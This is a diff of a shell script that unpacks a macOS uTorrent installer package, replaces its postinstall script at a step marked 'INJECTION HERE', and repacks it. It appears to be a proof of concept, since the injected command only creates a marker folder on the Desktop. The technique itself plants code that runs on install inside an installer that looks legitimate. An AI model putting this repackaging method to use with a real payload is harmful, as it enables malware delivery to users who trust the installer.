@@ -1,4 +1,3 @@
-
 mkdir tmp
 cd tmp
 
@@ -8,18 +7,17 @@ xar -xf ./in.pkg
 rm ./in.pkg
 
 # CHOSE PKG
-cd 1.pkg
+cd uTorrent_Web_Installer.pkg
 
 mv Scripts Scripts.tmp
 mkdir Scripts
 cd Scripts
-gzip -d ../Scripts.tmp # cpio -i -F ../Scripts.tmp
+cpio -i -F ../Scripts.tmp
 rm ../Scripts.tmp
 
 # INJECTION HERE
-echo "mkdir /home/taguar/Desktop/INJECTION_202" >> post_install
+echo "#!/bin/bash\nmkdir /Users/taguar/Desktop/INJECTION_202" > postinstall
 
 cd ../../
 
-pkgutil --flaten . out.pkg
-
+pkgutil --flatten . out.pkg
